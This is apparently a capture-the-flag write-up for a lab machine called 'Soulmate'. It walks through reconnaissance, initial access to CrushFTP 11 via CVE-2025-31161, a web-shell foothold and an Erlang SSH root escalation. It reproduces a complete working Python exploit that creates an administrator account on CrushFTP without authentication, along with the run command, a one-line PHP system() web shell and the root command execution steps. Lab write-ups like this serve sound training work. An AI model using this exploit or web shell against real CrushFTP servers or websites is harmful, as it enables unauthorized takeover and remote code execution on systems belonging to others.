## **1. Reconnaissance & Subdomain Fuzzing**

The engagement began with an `nmap` scan to identify open ports and services on the target IP.1

### **Initial Nmap Scan**

```bash
nmap -sC -sV -oN nmap_report.txt soulmate.htb
```

- **Port 22:** OpenSSH 8.9p1
- **Port 80:** Nginx (Hosting a dating-themed web application)
### **Subdomain Discovery**

Since the main site was a standard PHP application, I used `ffuf` to look for hidden subdomains.

```bash
gobuster vhost -u http://soulmate.htb \
    -w SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain
```

- **Result Found:** `ftp.soulmate.htb`
- **Discovery:** This subdomain points to a **CrushFTP v11** management interface.

---

## **2. Initial Access: Exploiting CrushFTP (CVE-2025-31161)**

By inspecting the source code of the `ftp.soulmate.htb` login page, the version was confirmed as **CrushFTP 11**. This version is vulnerable to **CVE-2025-31161**, an Authentication Bypass that allows for unauthenticated administrative actions.2

### **The Exploit**

Using a Python-based exploit for CVE-2025-31161, I bypassed the login to create a new administrative user.

```python
# Copyright (C) 2025 Kev Breen,Ben McCarthy Immersive
# https://github.com/Immersive-Labs-Sec/CVE-2025-31161
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import requests
from argparse import ArgumentParser


def exploit(target_host, port, target_user, new_user, password):
    print("[+] Preparing Payloads")
    
    # First request details
    warm_up_url = f"http://{target_host}:{port}/WebInterface/function/"
    create_user_url = f"http://{target_host}:{port}/WebInterface/function/"


    headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
    }

    payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{new_user}</user_name><password>{password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }

    # Execute requests sequentially
    print("  [-] Warming up the target")
    # we jsut fire a request and let it time out. 
    try:
        warm_up_request = requests.get(warm_up_url, headers=headers, timeout=20)
        if warm_up_request.status_code == 200:
            print("  [-] Target is up and running")
    except requests.exceptions.ConnectionError:
        print("  [-] Request timed out, continuing with exploit")


    print("[+] Sending Account Create Request")
    create_user_request = requests.post(create_user_url, headers=headers, data=payload)
    if create_user_request.status_code != 200:
        print("  [-] Failed to send request")
        print("  [+] Status code:", create_user_request.status_code)
    if '<response_status>OK</response_status>' in create_user_request.text:
        print("  [!] User created successfully")



if __name__ == "__main__":
    parser = ArgumentParser(description="Exploit CVE-2025-31161 to create a new account")
    parser.add_argument("--target_host", help="Target host")
    parser.add_argument("--port", type=int, help="Target port", default=8080)
    parser.add_argument("--target_user", help="Target user", default="crushadmin")
    parser.add_argument("--new_user", help="New user to create", default="AuthBypassAccount")
    parser.add_argument("--password", help="Password for the new user", default="CorrectHorseBatteryStaple")

    args = parser.parse_args()

    if not args.target_host:
        print("  [-] Target host not specified")
        parser.print_help()
        exit(1)

    exploit(
        target_host=args.target_host,
        port=args.port,
        target_user=args.target_user,
        new_user=args.new_user,
        password=args.password
    )

    print(f"[+] Exploit Complete you can now login with\n   [*] Username: {args.new_user}\n   [*] Password: {args.password}.")

```

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user hyh --password admin123
```

- **Outcome:** Success. I logged into the CrushFTP dashboard with the new credentials.
---

## **3. Foothold: From Web Console to Remote Code Execution**

Once inside the CrushFTP dashboard, I performed horizontal movement to bridge the gap to the system level.

### **Account Hijacking**

1. Accessed the **User Manager**.
2. Identified a system user named **ben**.
3. Manually reset **ben's** CrushFTP password to `12345` within the console.

### **Gaining RCE**

CrushFTP allows file management.3 I identified a directory named `webProd`, which was symlinked to the root folder of the main `soulmate.htb` website.
1. **Payload Deployment:** Uploaded `exploit.php` (a simple PHP web shell) to the `webProd` directory.
```php
<?php system($_GET['cmd']); ?>
```

2. **Execution:** Verified execution by visiting `http://soulmate.htb/exploit.php?cmd=id`.
    - **Response:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## **4. Horizontal Escalation: Hunting for "Ben"**

As `www-data`, I had limited access. I needed to find Ben's real system password to move forward.
### **Internal Service Enumeration**

Checking internal listening ports revealed something unusual on **Port 2222**:
```bash
ss -tuln
# Result: 127.0.0.1:2222 (LISTEN)
```

Connecting with `nc -v 127.0.0.1 2222` revealed the banner: **`SSH-2.0-Erlang/5.2.9`**. This indicated a custom Erlang-based SSH service.

### **The Password Leak**
I searched for Erlang-related files in non-standard directories like `/usr/local/lib/`.
```bash
cat /usr/local/lib/erlang_login/start.escript
```

Inside this script, the SSH daemon configuration was visible in plain text:

```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

- **System Credentials Found:** `ben : HouseH0ldings998`
---

## **5. Privilege Escalation: Root Shell via Erlang**

With Ben's credentials, I moved to the final phase.

### **Escalating to Ben**
```bash
su ben
# Password: HouseH0ldings998
```

### **Abusing the Erlang SSH Node**

The service on **Port 2222** was running as **root**. Since I had Ben's password, I could log into this internal Erlang-based SSH management console.

```bash
ssh ben@127.0.0.1 -p 2222
```

This dropped me into a `(ssh_runner@soulmate)1>` prompt (Erlang Interactive Shell).

### **Final Root Execution**

In Erlang, the `os:cmd` function allows for system command execution.4 Since the runner was executing as root, any command sent here would have full privileges.

```bash
os:cmd("id").
% Output: uid=0(root) gid=0(root) groups=0(root)

os:cmd("cat /root/root.txt").
```

---

## **Summary of the Attack Chain**

|**Step**|**Target**|**Method**|**Result**|
|---|---|---|---|
|**1**|`ftp.soulmate.htb`|**CVE-2025-31161**|Admin Bypass|
|**2**|CrushFTP Console|User Manipulation|Access to Ben's files|
|**3**|Web Root|PHP Web Shell Upload|Shell as `www-data`|
|**4**|`/usr/local/lib/`|File Discovery|Ben's SSH Password|
|**5**|Port 2222|Erlang `os:cmd` Abuse|**ROOT ACCESS**|

---
